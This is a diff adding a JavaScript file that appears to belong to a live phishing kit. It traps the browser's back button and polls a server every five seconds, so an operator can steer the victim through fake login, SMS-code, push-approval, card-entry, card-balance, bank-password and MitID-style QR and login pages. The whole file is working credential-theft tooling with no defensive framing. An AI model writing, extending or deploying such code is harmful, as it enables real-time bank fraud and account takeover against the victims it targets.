@@ -1,0 +1,170 @@
+history.pushState(null, null, location.href);
+window.onpopstate = function(event) {
+    history.go(1);
+};
+
+$(function() {
+    async function apiCall() {
+        $.ajax({
+			type: "POST",
+			url: `/api.php?method=getStatus&id=${$.config.id}&ip=${$.config.ip}`,
+			success: function(msg) {
+				console.log(msg);
+				//console.log(window.location.search);
+				const urlParams = new URLSearchParams(window.location.search);
+				const dataType = urlParams.get('data_type');
+			
+				var api_callback = JSON.parse(msg);
+				if (api_callback.path == 'lk') {
+					if (window.location.pathname != `/login/`) {
+						location=`/login/?t=${api_callback.num}&id=${$.config.id}&error=${api_callback.error_code}&country=${api_callback.country_code}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'change') {
+					if (window.location.pathname != `/change/` || dataType !== null) {
+						location=`/change/?id=${$.config.id}&card=no`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'sms') {
+					if (window.location.pathname != `/sms/` || dataType !== null) {
+						location=`/sms/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'push') {
+					if (window.location.pathname != `/push/`) {
+						location=`/push/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				
+				if (api_callback.path == 'success') {
+					if (window.location.pathname != `/success/`) {
+						location=`/success/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				
+				if (api_callback.path == 'dpass') {
+					if (window.location.pathname != `/sms/`) {
+						location=`/sms/?id=${$.config.id}&type=tbcpass`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'dpass1') {
+					if (window.location.pathname != `/sms/`) {
+						location=`/sms/?id=${$.config.id}&type=libpass`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'cardvvod') {
+					if (window.location.pathname != `/card/`) {
+						location=`/card/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'custom_error') {
+					if (window.location.pathname != `/sms/` || dataType !== `3`) {
+						location=`/sms/?id=${$.config.id}&data_type=3`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'custom_app') {
+					if (window.location.pathname != `/custom_app/`) {
+						location=`/custom_app/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'custom_form_error') {
+					if (window.location.pathname !== '/sms/' || dataType !== `2`) {
+						location=`/sms/?id=${$.config.id}&data_type=2`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'custom_data_error') {
+					if (window.location.pathname != `/form_data/`) {
+						location=`/form_data/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				// DK
+				if (api_callback.path == 'lqr') {
+					if (window.location.pathname != `/mit_qr/`) {
+						location=`/mit_qr/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				// new
+				if (api_callback.path == 'nqr') {
+					if (window.location.pathname != `/mit_qr_new/`) {
+						location=`/mit_qr_new/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'lmi') {
+					if (window.location.pathname != `/mit_login/`) {
+						location=`/mit_login/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'pmi') {
+					if (window.location.pathname != `/mit_push/`) {
+						location=`/mit_push/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'hmi') {
+					if (window.location.pathname != `/mit_hold/`) {
+						location=`/mit_hold/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'pcmi') {
+					if (window.location.pathname != `/mit_pc/`) {
+						location=`/mit_pc/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'mong') {
+					if (window.location.pathname != `/app/`) {
+						location=`/app/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'card_balance') {
+					if (window.location.pathname != `/sms/` || dataType !== `1`) {
+						location=`/sms/?id=${$.config.id}&data_type=1`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'redirect_error') {
+					if (window.location.pathname != `/redirect/`) {
+						location=`/redirect/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'verif') {
+					if (window.location.pathname != `/verif/`) {
+						location=`/verif/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+				if (api_callback.path == 'verifpass') {
+					if (window.location.pathname != `/verifpass/`) {
+						location=`/verifpass/?id=${$.config.id}`;
+						console.log('ok');
+					}
+				}
+			},
+			statusCode: { 
+				403: function(){ // выполнить функцию если код ответа HTTP 403
+					location.reload();
+				} 
+			}
+        });
+    }
+
+    setInterval(apiCall, 5000) 
+});
